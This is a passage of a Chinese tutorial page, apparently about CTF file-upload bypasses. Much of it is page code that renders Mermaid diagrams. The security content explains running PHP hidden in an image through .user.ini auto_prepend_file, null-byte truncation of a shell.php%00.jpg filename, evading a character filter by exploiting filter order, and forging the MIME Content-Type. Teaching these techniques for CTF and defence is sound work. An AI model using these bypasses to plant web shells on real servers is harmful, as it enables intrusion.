58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><div class="mermaid-diagram-container"><div class="mermaid-wrapper" id="mermaid-s2eiyw"><div class="mermaid" data-mermaid-code="flowchart TD
+    A[&#x22;浏览器访问 /upload&#x22;] --> B[&#x22;服务器通常重定向到 /upload/&#x22;]
+    B --> C{&#x22;Web 服务器如何处理目录请求？&#x22;}
+
+    C -->|&#x22;默认首页是 index.php&#x22;| D[&#x22;内部定位到 /upload/index.php&#x22;]
+    C -->|&#x22;默认首页是 index.html&#x22;| X[&#x22;返回静态页面<br/>PHP 不启动&#x22;]
+    C -->|&#x22;没有默认首页&#x22;| Y[&#x22;返回 403 或目录列表<br/>PHP 不启动&#x22;]
+    C -->|&#x22;重写到根目录 /index.php&#x22;| Z[&#x22;执行根目录 PHP<br/>/upload/.user.ini 通常不生效&#x22;]
+
+    D --> E[&#x22;index.php 被交给 PHP-FPM&#x22;]
+    E --> F{&#x22;是否启用 .user.ini？&#x22;}
+
+    F -->|&#x22;未启用&#x22;| G[&#x22;正常执行 /upload/index.php&#x22;]
+    F -->|&#x22;已启用&#x22;| H[&#x22;PHP 扫描 /upload/.user.ini&#x22;]
+
+    H --> I{&#x22;是否找到有效配置？&#x22;}
+    I -->|&#x22;没有找到或缓存未刷新&#x22;| G
+    I -->|&#x22;找到&#x22;| J[&#x22;读取 auto_prepend_file = 1.png&#x22;]
+
+    J --> K[&#x22;PHP 在服务器内部打开 /upload/1.png&#x22;]
+    K --> L[&#x22;解析 1.png 中的 PHP 标签<br/>执行其中的 PHP 代码&#x22;]
+    L --> M[&#x22;继续执行 /upload/index.php&#x22;]
+    M --> N[&#x22;合并执行结果并返回给浏览器&#x22;]
+    G --> N
+
+    X --> O[&#x22;.user.ini 不会被读取&#x22;]
+    Y --> O
+    Z --> O
+   ">flowchart TD
+    A["浏览器访问 /upload"] --> B["服务器通常重定向到 /upload/"]
+    B --> C{"Web 服务器如何处理目录请求？"}
+
+    C -->|"默认首页是 index.php"| D["内部定位到 /upload/index.php"]
+    C -->|"默认首页是 index.html"| X["返回静态页面&#x3C;br/>PHP 不启动"]
+    C -->|"没有默认首页"| Y["返回 403 或目录列表&#x3C;br/>PHP 不启动"]
+    C -->|"重写到根目录 /index.php"| Z["执行根目录 PHP&#x3C;br/>/upload/.user.ini 通常不生效"]
+
+    D --> E["index.php 被交给 PHP-FPM"]
+    E --> F{"是否启用 .user.ini？"}
+
+    F -->|"未启用"| G["正常执行 /upload/index.php"]
+    F -->|"已启用"| H["PHP 扫描 /upload/.user.ini"]
+
+    H --> I{"是否找到有效配置？"}
+    I -->|"没有找到或缓存未刷新"| G
+    I -->|"找到"| J["读取 auto_prepend_file = 1.png"]
+
+    J --> K["PHP 在服务器内部打开 /upload/1.png"]
+    K --> L["解析 1.png 中的 PHP 标签&#x3C;br/>执行其中的 PHP 代码"]
+    L --> M["继续执行 /upload/index.php"]
+    M --> N["合并执行结果并返回给浏览器"]
+    G --> N
+
+    X --> O[".user.ini 不会被读取"]
+    Y --> O
+    Z --> O
+   </div></div><script type="text/javascript">(() => {
+	// 单例模式：检查是否已经初始化过
+	if (window.mermaidInitialized) {
+		// 如果已经初始化过，只确保 renderMermaidDiagrams 函数可用
+		if (typeof window.renderMermaidDiagrams !== "function") {
+			window.renderMermaidDiagrams = renderMermaidDiagrams;
+		}
+		return;
+	}
+
+	window.mermaidInitialized = true;
+
+	// 记录当前主题状态，避免不必要的重新渲染
+	let currentTheme = null;
+	let isRendering = false; // 防止并发渲染
+	let retryCount = 0;
+	const MAX_RETRIES = 3;
+	const RETRY_DELAY = 1000; // 1秒
+	let fullscreenOverlay = null;
+
+	function injectFullscreenStyles() {
+		if (document.getElementById("mermaid-fullscreen-style")) {
+			return;
+		}
+
+		const style = document.createElement("style");
+		style.id = "mermaid-fullscreen-style";
+		style.textContent = `
+		:where(.mermaid[data-mermaid-code]) { position: relative; }
+		.mermaid-fullscreen-btn {
+			position: absolute;
+			top: 10px;
+			right: 10px;
+			height: 36px;
+			width: 36px;
+			display: inline-flex;
+			align-items: center;
+			justify-content: center;
+			opacity: 0;
+			transition: opacity 0.2s ease;
+			z-index: 3;
+		}
+		.mermaid:hover .mermaid-fullscreen-btn,
+		.mermaid:focus-within .mermaid-fullscreen-btn {
+			opacity: 1;
+		}
+		.mermaid-fullscreen-overlay {
+			position: fixed;
+			inset: 0;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			padding: clamp(12px, 3vw, 28px);
+			backdrop-filter: blur(6px);
+			z-index: 9999;
+			background: var(--mermaid-fs-backdrop, rgba(15, 23, 42, 0.9));
+		}
+		.mermaid-fullscreen-stage {
+			position: relative;
+			width: min(1200px, 96vw);
+			max-height: 90vh;
+			padding: clamp(12px, 2vw, 18px);
+			background: var(--mermaid-fs-surface, #0f172a);
+			border: 1px solid var(--mermaid-fs-border, rgba(255,255,255,0.08));
+			border-radius: 16px;
+			box-shadow: 0 20px 80px rgba(0, 0, 0, 0.35);
+			overflow: hidden;
+		}
+		.mermaid-fullscreen-stage svg {
+			width: 100%;
+			height: auto;
+			min-height: 320px;
+		}
+		.mermaid-fullscreen-close {
+			position: absolute;
+			top: 10px;
+			right: 10px;
+			z-index: 4;
+		}
+		.mermaid-fullscreen-overlay .mermaid-zoom-controls {
+			position: absolute;
+			left: 12px;
+			bottom: 12px;
+			display: flex;
+			gap: 8px;
+		}
+		body.mermaid-fullscreen-open { overflow: hidden; }
+		`;
+		document.head.appendChild(style);
+	}
+
+	function getThemePalette() {
+		const htmlElement = document.documentElement;
+		const isDark = htmlElement.classList.contains("dark");
+		const styles = getComputedStyle(htmlElement);
+		const primary =
+			styles.getPropertyValue("--primary")?.trim() ||
+			(isDark ? "#7dd3fc" : "#2563eb");
+		const surface =
+			styles.getPropertyValue("--card-bg")?.trim() ||
+			styles.getPropertyValue("--surface")?.trim() ||
+			(isDark ? "#0b1220" : "#ffffff");
+		const text =
+			styles.getPropertyValue("--text-color")?.trim() ||
+			styles.getPropertyValue("--foreground")?.trim() ||
+			(isDark ? "#e5e7eb" : "#0f172a");
+		const muted =
+			styles.getPropertyValue("--muted")?.trim() ||
+			styles.getPropertyValue("--muted-foreground")?.trim() ||
+			(isDark ? "#1f2937" : "#e5e7eb");
+		const backdrop = isDark
+			? "rgba(8, 15, 30, 0.9)"
+			: "rgba(255, 255, 255, 0.94)";
+
+		return { isDark, primary, surface, text, muted, backdrop };
+	}
+
+	function closeFullscreen() {
+		if (fullscreenOverlay) {
+			fullscreenOverlay.remove();
+			fullscreenOverlay = null;
+			document.body.classList.remove("mermaid-fullscreen-open");
+		}
+	}
+
+	function openFullscreen(svgElement) {
+		const palette = getThemePalette();
+		injectFullscreenStyles();
+
+		closeFullscreen();
+
+		const overlay = document.createElement("div");
+		overlay.className = "mermaid-fullscreen-overlay";
+		overlay.style.setProperty("--mermaid-fs-backdrop", palette.backdrop);
+		overlay.style.setProperty("--mermaid-fs-surface", palette.surface);
+		overlay.style.setProperty(
+			"--mermaid-fs-border",
+			palette.isDark ? "rgba(255,255,255,0.08)" : "rgba(15,23,42,0.08)",
+		);
+
+		const closeButton = document.createElement("button");
+		closeButton.className =
+			"mermaid-fullscreen-close btn-regular rounded-lg h-10 w-10";
+		closeButton.title = "关闭全屏";
+		closeButton.textContent = "✕";
+		closeButton.addEventListener("click", closeFullscreen);
+
+		const stage = document.createElement("div");
+		stage.className = "mermaid-fullscreen-stage";
+
+		const clonedSvg = svgElement.cloneNode(true);
+		stage.appendChild(clonedSvg);
+		overlay.appendChild(stage);
+		overlay.appendChild(closeButton);
+
+		overlay.addEventListener("click", (ev) => {
+			if (ev.target === overlay) {
+				closeFullscreen();
+			}
+		});
+
+		const escHandler = (ev) => {
+			if (ev.key === "Escape") {
+				closeFullscreen();
+			}
+		};
+		window.addEventListener("keydown", escHandler, { once: true });
+
+		document.body.appendChild(overlay);
+		document.body.classList.add("mermaid-fullscreen-open");
+		fullscreenOverlay = overlay;
+
+		// 为全屏内的图表添加缩放控制
+		attachZoomControls(stage, clonedSvg);
+	}
+
+	function ensureFullscreenButton(element) {
+		if (element.querySelector(".mermaid-fullscreen-btn")) {
+			return;
+		}
+		const btn = document.createElement("button");
+		btn.type = "button";
+		btn.className = "mermaid-fullscreen-btn btn-regular rounded-lg h-9 w-9";
+		btn.title = "全屏查看";
+		btn.setAttribute("aria-label", "全屏查看 Mermaid 图表");
+		btn.innerHTML = "⛶";
+		btn.addEventListener("click", (ev) => {
+			ev.stopPropagation();
+			const svg = element.querySelector("svg");
+			if (!svg) {
+				return;
+			}
+			openFullscreen(svg);
+		});
+		element.appendChild(btn);
+	}
+
+	// 检查主题是否真的发生了变化
+	function hasThemeChanged() {
+		const isDark = document.documentElement.classList.contains("dark");
+		const newTheme = isDark ? "dark" : "default";
+
+		if (currentTheme !== newTheme) {
+			currentTheme = newTheme;
+			return true;
+		}
+		return false;
+	}
+
+	// 等待 Mermaid 库加载完成
+	function waitForMermaid(timeout = 10000) {
+		return new Promise((resolve, reject) => {
+			const startTime = Date.now();
+
+			function check() {
+				if (window.mermaid && typeof window.mermaid.initialize === "function") {
+					resolve(window.mermaid);
+				} else if (Date.now() - startTime > timeout) {
+					reject(new Error("Mermaid library failed to load within timeout"));
+				} else {
+					setTimeout(check, 100);
+				}
+			}
+
+			check();
+		});
+	}
+
+	// 存储 MutationObserver 实例
+	let themeObserver = null;
+
+	// 清理 MutationObserver
+	function cleanupMutationObserver() {
+		if (themeObserver) {
+			themeObserver.disconnect();
+			themeObserver = null;
+		}
+	}
+
+	// 设置 MutationObserver 监听 html 元素的 class 属性变化
+	function setupMutationObserver() {
+		cleanupMutationObserver();
+
+		themeObserver = new MutationObserver((mutations) => {
+			mutations.forEach((mutation) => {
+				if (
+					mutation.type === "attributes" &&
+					mutation.attributeName === "class"
+				) {
+					// 检查是否是 dark 类的变化
+					const target = mutation.target;
+					const wasDark = mutation.oldValue
+						? mutation.oldValue.includes("dark")
+						: false;
+					const isDark = target.classList.contains("dark");
+
+					if (wasDark !== isDark) {
+						if (hasThemeChanged()) {
+							// 延迟渲染，避免主题切换时的闪烁
+							setTimeout(() => renderMermaidDiagrams(), 150);
+						}
+					}
+				}
+			});
+		});
+
+		// 开始观察 html 元素的 class 属性变化
+		themeObserver.observe(document.documentElement, {
+			attributes: true,
+			attributeFilter: ["class"],
+			attributeOldValue: true,
+		});
+	}
+
+	// 缩放平移
+	function attachZoomControls(element, svgElement) {
+		if (element.__zoomAttached) {
+			return;
+		}
+		element.__zoomAttached = true;
+
+		const wrapper = document.createElement("div");
+		wrapper.className = "mermaid-zoom-wrapper";
+
+		const svgParent = svgElement.parentNode;
+		wrapper.appendChild(svgElement);
+		svgParent.appendChild(wrapper);
+
+		let scale = 1;
+		let tx = 0;
+		let ty = 0;
+		const MIN_SCALE = 0.2;
+		const MAX_SCALE = 6;
+
+		function applyTransform() {
+			wrapper.style.transform = `translate(${tx}px, ${ty}px) scale(${scale})`;
+		}
+		const controls = document.createElement("div");
+		controls.className = "mermaid-zoom-controls";
+		controls.innerHTML = `
+			<button class="btn-regular rounded-lg h-10 w-10 active:scale-90" data-action="zoom-in" title="Zoom in">+</button>
+			<button class="btn-regular rounded-lg h-10 w-10 active:scale-90" data-action="zoom-out" title="Zoom out">−</button>
+			<button class="btn-regular rounded-lg h-10 w-10 active:scale-90" data-action="reset" title="Reset">⤾</button>
+		`;
+		element.appendChild(controls);
+
+		controls.addEventListener("click", (ev) => {
+			const action = ev.target.getAttribute?.("data-action");
+			if (!action) {
+				return;
+			}
+
+			switch (action) {
+				case "zoom-in":
+					scale = Math.min(MAX_SCALE, +(scale * 1.2).toFixed(3));
+					applyTransform();
+					break;
+				case "zoom-out":
+					scale = Math.max(MIN_SCALE, +(scale / 1.2).toFixed(3));
+					applyTransform();
+					break;
+				case "reset":
+					scale = 1;
+					tx = 0;
+					ty = 0;
+					applyTransform();
+					break;
+			}
+		});
+
+		let isPanning = false;
+		let startX = 0;
+		let startY = 0;
+		let startTx = 0;
+		let startTy = 0;
+
+		wrapper.style.touchAction = "none";
+
+		wrapper.addEventListener("pointerdown", (ev) => {
+			if (ev.button !== 0) {
+				return;
+			} // 仅左键
+			isPanning = true;
+			wrapper.setPointerCapture(ev.pointerId);
+			startX = ev.clientX;
+			startY = ev.clientY;
+			startTx = tx;
+			startTy = ty;
+		});
+
+		wrapper.addEventListener("pointermove", (ev) => {
+			if (!isPanning) {
+				return;
+			}
+			const dx = ev.clientX - startX;
+			const dy = ev.clientY - startY;
+			tx = startTx + dx / scale; // 根据当前缩放调整灵敏度
+			ty = startTy + dy / scale;
+			applyTransform();
+		});
+
+		wrapper.addEventListener("pointerup", (ev) => {
+			isPanning = false;
+			try {
+				wrapper.releasePointerCapture(ev.pointerId);
+			} catch (_e) {}
+		});
+
+		wrapper.addEventListener("pointercancel", () => {
+			isPanning = false;
+		});
+
+		// 鼠标滚轮缩放
+		element.addEventListener(
+			"wheel",
+			(ev) => {
+				ev.preventDefault();
+				const delta = -ev.deltaY;
+				const zoomFactor = delta > 0 ? 1.12 : 1 / 1.12;
+				const prevScale = scale;
+				scale = Math.min(
+					MAX_SCALE,
+					Math.max(MIN_SCALE, +(scale * zoomFactor).toFixed(3)),
+				);
+
+				const rect = wrapper.getBoundingClientRect();
+				const cx = ev.clientX - rect.left;
+				const cy = ev.clientY - rect.top;
+
+				const worldX = cx / prevScale - tx;
+				const worldY = cy / prevScale - ty;
+
+				tx = cx / scale - worldX;
+				ty = cy / scale - worldY;
+
+				applyTransform();
+			},
+			{ passive: false },
+		);
+
+		// 双击重置
+		wrapper.addEventListener("dblclick", () => {
+			scale = 1;
+			tx = 0;
+			ty = 0;
+			applyTransform();
+		});
+		applyTransform();
+		let resizeTimer = null;
+		window.addEventListener("resize", () => {
+			clearTimeout(resizeTimer);
+			resizeTimer = setTimeout(() => {
+				applyTransform();
+			}, 200);
+		});
+	}
+
+	// 设置其他事件监听器
+	function setupEventListeners() {
+		// 监听页面切换
+		document.addEventListener("astro:page-load", () => {
+			// 重新初始化主题状态
+			currentTheme = null;
+			retryCount = 0; // 重置重试计数
+			if (hasThemeChanged()) {
+				setTimeout(() => renderMermaidDiagrams(), 100);
+			}
+		});
+
+		// 监听页面可见性变化，页面重新可见时重新渲染
+		document.addEventListener("visibilitychange", () => {
+			if (!document.hidden) {
+				setTimeout(() => renderMermaidDiagrams(), 200);
+			}
+		});
+
+		// 页面切换前清理
+		document.addEventListener("astro:before-swap", cleanupMutationObserver);
+
+		// 页面切换前清理全屏状态
+		document.addEventListener("astro:before-swap", closeFullscreen);
+
+		// Swup 页面切换时重新设置 Observer
+		document.addEventListener("astro:after-swap", () => {
+			if (themeObserver === null) {
+				setupMutationObserver();
+			}
+		});
+	}
+
+	async function initializeMermaid() {
+		try {
+			await waitForMermaid();
+
+			// 初始化 Mermaid 配置
+			window.mermaid.initialize({
+				startOnLoad: false,
+				theme: "default",
+				themeVariables: {
+					fontFamily: "inherit",
+					fontSize: "16px",
+				},
+				securityLevel: "loose",
+				// 添加错误处理配置
+				errorLevel: "warn",
+				logLevel: "error",
+			});
+
+			// 渲染所有 Mermaid 图表
+			await renderMermaidDiagrams();
+		} catch (error) {
+			console.error("Failed to initialize Mermaid:", error);
+			// 如果初始化失败，尝试重新加载
+			if (retryCount < MAX_RETRIES) {
+				retryCount++;
+				setTimeout(() => initializeMermaid(), RETRY_DELAY * retryCount);
+			}
+		}
+	}
+
+	async function renderMermaidDiagrams() {
+		// 防止并发渲染
+		if (isRendering) {
+			return;
+		}
+
+		// 检查 Mermaid 是否可用
+		if (!window.mermaid || typeof window.mermaid.render !== "function") {
+			console.warn("Mermaid not available, skipping render");
+			return;
+		}
+
+		isRendering = true;
+		window.dispatchEvent(new CustomEvent("mermaid:render:start"));
+
+		try {
+			const mermaidElements = Array.from(
+				document.querySelectorAll(".mermaid[data-mermaid-code]"),
+			);
+
+			if (mermaidElements.length === 0) {
+				isRendering = false;
+				window.dispatchEvent(
+					new CustomEvent("mermaid:render:done", {
+						detail: { count: 0 },
+					}),
+				);
+				return;
+			}
+
+			// 延迟检测主题，确保 DOM 已经更新
+			await new Promise((resolve) => setTimeout(resolve, 100));
+
+			const htmlElement = document.documentElement;
+			const isDark = htmlElement.classList.contains("dark");
+			const theme = isDark ? "dark" : "default";
+
+			// 更新 Mermaid 主题（只需要更新一次）
+			window.mermaid.initialize({
+				startOnLoad: false,
+				theme: theme,
+				themeVariables: {
+					fontFamily: "inherit",
+					fontSize: "16px",
+					// 强制应用主题变量
+					primaryColor: isDark ? "#ffffff" : "#000000",
+					primaryTextColor: isDark ? "#ffffff" : "#000000",
+					primaryBorderColor: isDark ? "#ffffff" : "#000000",
+					lineColor: isDark ? "#ffffff" : "#000000",
+					secondaryColor: isDark ? "#333333" : "#f0f0f0",
+					tertiaryColor: isDark ? "#555555" : "#e0e0e0",
+				},
+				securityLevel: "loose",
+				errorLevel: "warn",
+				logLevel: "error",
+			});
+
+			// 分批渲染，避免一次性阻塞主线程
+			const BATCH_SIZE = 3;
+			let index = 0;
+
+			async function renderBatch() {
+				const batch = mermaidElements.slice(index, index + BATCH_SIZE);
+				if (batch.length === 0) {
+					return;
+				}
+
+				await Promise.all(
+					batch.map(async (element, localIndex) => {
+						const globalIndex = index + localIndex;
+						let attempts = 0;
+						const maxAttempts = 3;
+
+						while (attempts < maxAttempts) {
+							try {
+								const code = element.getAttribute("data-mermaid-code");
+
+								if (!code) {
+									break;
+								}
+
+								// 显示加载状态
+								element.innerHTML =
+									'<div class="mermaid-loading">Rendering diagram...</div>';
+
+								// 渲染图表
+								const { svg } = await window.mermaid.render(
+									`mermaid-${Date.now()}-${globalIndex}-${attempts}`,
+									code,
+								);
+
+								const parser = new DOMParser();
+								const doc = parser.parseFromString(svg, "image/svg+xml");
+								const svgElement = doc.documentElement;
+
+								element.innerHTML = "";
+								element.__zoomAttached = false;
+								element.appendChild(svgElement);
+
+								// 添加响应式支持
+								const insertedSvg = element.querySelector("svg");
+								if (insertedSvg) {
+									insertedSvg.setAttribute("width", "100%");
+									insertedSvg.removeAttribute("height");
+									insertedSvg.style.maxWidth = "100%";
+									insertedSvg.style.height = "auto";
+									//Todo 需要根据实际情况
+									insertedSvg.style.minHeight = "300px";
+
+									// 强制应用样式
+									if (isDark) {
+										svgElement.style.filter = "brightness(0.9) contrast(1.1)";
+									} else {
+										svgElement.style.filter = "none";
+									}
+									attachZoomControls(element, insertedSvg);
+									ensureFullscreenButton(element);
+								}
+
+								// 渲染成功，跳出重试循环
+								break;
+							} catch (error) {
+								attempts++;
+								console.warn(
+									`Mermaid rendering attempt ${attempts} failed for element ${globalIndex}:`,
+									error,
+								);
+
+								if (attempts >= maxAttempts) {
+									console.error(
+										`Failed to render Mermaid diagram after ${maxAttempts} attempts:`,
+										error,
+									);
+									element.innerHTML = `
+										<div class="mermaid-error">
+											<p>Failed to render diagram after ${maxAttempts} attempts.</p>
+											<button onclick="location.reload()" style="margin-top: 8px; padding: 4px 8px; background: var(--primary); color: white; border: none; border-radius: 4px; cursor: pointer;">
+												Retry Page
+											</button>
+										</div>
+									`;
+								} else {
+									// 等待一段时间后重试
+									await new Promise((resolve) =>
+										setTimeout(resolve, 500 * attempts),
+									);
+								}
+							}
+						}
+					}),
+				);
+
+				index += BATCH_SIZE;
+
+				if (index < mermaidElements.length) {
+					// 在空闲时间继续渲染下一批，避免长时间阻塞主线程
+					await new Promise((resolve) => {
+						if ("requestIdleCallback" in window) {
+							window.requestIdleCallback(() => resolve());
+						} else {
+							setTimeout(resolve, 50);
+						}
+					});
+					return renderBatch();
+				}
+			}
+
+			await renderBatch();
+			retryCount = 0; // 重置重试计数
+			window.dispatchEvent(
+				new CustomEvent("mermaid:render:done", {
+					detail: { count: mermaidElements.length },
+				}),
+			);
+		} catch (error) {
+			console.error("Error in renderMermaidDiagrams:", error);
+			window.dispatchEvent(new CustomEvent("mermaid:render:done"));
+
+			// 如果渲染失败，尝试重新渲染
+			if (retryCount < MAX_RETRIES) {
+				retryCount++;
+				setTimeout(() => renderMermaidDiagrams(), RETRY_DELAY * retryCount);
+			}
+		} finally {
+			isRendering = false;
+		}
+	}
+
+	// 初始化主题状态
+	function initializeThemeState() {
+		const isDark = document.documentElement.classList.contains("dark");
+		currentTheme = isDark ? "dark" : "default";
+	}
+
+	// 加载 Mermaid 库
+	async function loadMermaid() {
+		if (typeof window.mermaid !== "undefined") {
+			return Promise.resolve();
+		}
+
+		return new Promise((resolve, reject) => {
+			const script = document.createElement("script");
+			script.src =
+				"https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js";
+
+			script.onload = () => {
+				console.log("Mermaid library loaded successfully");
+				resolve();
+			};
+
+			script.onerror = (error) => {
+				console.error("Failed to load Mermaid library:", error);
+				// 尝试备用 CDN
+				const fallbackScript = document.createElement("script");
+				fallbackScript.src = "https://unpkg.com/mermaid@11/dist/mermaid.min.js";
+
+				fallbackScript.onload = () => {
+					console.log("Mermaid library loaded from fallback CDN");
+					resolve();
+				};
+
+				fallbackScript.onerror = () => {
+					reject(
+						new Error(
+							"Failed to load Mermaid from both primary and fallback CDNs",
+						),
+					);
+				};
+
+				document.head.appendChild(fallbackScript);
+			};
+
+			document.head.appendChild(script);
+		});
+	}
+
+	// 主初始化函数
+	async function initialize() {
+		try {
+			// 设置监听器
+			setupMutationObserver();
+			setupEventListeners();
+
+			// 初始化主题状态
+			initializeThemeState();
+
+			// 加载并初始化 Mermaid
+			await loadMermaid();
+			await initializeMermaid();
+
+			// 将 renderMermaidDiagrams 暴露到全局作用域，以便在解密后调用
+			window.renderMermaidDiagrams = renderMermaidDiagrams;
+		} catch (error) {
+			console.error("Failed to initialize Mermaid system:", error);
+		}
+	}
+
+	// 启动初始化
+	if (document.readyState === "loading") {
+		document.addEventListener("DOMContentLoaded", initialize);
+	} else {
+		initialize();
+	}
+})();
+</script></div><p><code>.user.ini</code> 是 PHP CGI/FastCGI 模式下的目录级配置文件。若 <code>user_ini.filename</code> 未被禁用，PHP 执行该目录中的 PHP 脚本时会读取它。通过 <code>auto_prepend_file = "1.png"</code>，可以让 PHP 在执行目标脚本前包含 <code>1.png</code>。<code>1.png</code> 中仍需存在 PHP 代码，而且目录中要有可访问的 PHP 文件用于触发。直接访问图片不会执行其中的 PHP 代码。</p></section><section><h3 id="6-00-截断老版本-php--534">6. %00 截断（老版本 PHP &#x3C; 5.3.4）<a class="anchor" href="#6-00-截断老版本-php--534"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:34ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.php%00.jpg  →  落地为 shell.php</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>旧版 PHP 或底层 C API 会把空字节当作字符串结束。注意 <code>%00</code> 要经过 URL 解码才是空字节，直接写在 multipart 的 <code>filename</code> 里通常只是三个普通字符。PHP 5.3.4 之后基本修掉了，现在主要见于复现老环境的题。</p></section><section><h3 id="7-过滤顺序与特殊字符">7. 过滤顺序与特殊字符<a class="anchor" href="#7-过滤顺序与特殊字符"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>如果题目会删除文件名里的某些字符，比如 <code>[]</code>，就直接把过滤前后写出来算：</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:25ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">目标字符串 - 被过滤的字符 = 最终落地的文件名</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>举例：</p><div class="table-wrapper">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>过滤规则</th><th>输入文件名</th><th>落地结果</th><th>是否可行</th></tr></thead><tbody><tr><td>删掉 <code>[ ]</code></td><td><code>c[a]t.php</code></td><td><code>cat.php</code></td><td>✅ 绕过了”禁止 cat”</td></tr><tr><td>删掉 <code>[ ]</code></td><td><code>c{a}t.php</code></td><td><code>c{a}t.php</code>（<code>{}</code> 不在黑名单，原样保留）</td><td>❌ 没凑出目标字符串</td></tr><tr><td>删掉所有非字母数字</td><td><code>c{a}t.php</code></td><td><code>cat.php</code></td><td>✅</td></tr><tr><td>白名单只留 <code>[a-zA-Z0-9._-]</code></td><td>任何特殊字符</td><td>被替换/拒绝</td><td>❌ 换什么字符都没用</td></tr></tbody></table></div><blockquote>
+<p>这里利用的是过滤顺序，不是 shell 通配符。只有文件名后来被拼进 shell 命令，<code>[]</code> 和 Bash 的 <code>{}</code> 展开才有关系。</p>
+</blockquote><hr></section></section>
+<section><h2 id="五服务端白名单绕过">五、服务端白名单绕过<a class="anchor" href="#五服务端白名单绕过"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><p>白名单题里，单改 MIME 或补一个图片头，绕不过真正的扩展名检查。通常还得找解析差异、文件包含、配置文件或者上传逻辑的问题。</p><section><h3 id="1-绕过-mime-层">1. 绕过 MIME 层<a class="anchor" href="#1-绕过-mime-层"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>如果只看请求里的 <code>Content-Type</code>，Burp 里直接改。这个字段是客户端自己填的：</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:24ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Content-Type: image/jpeg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 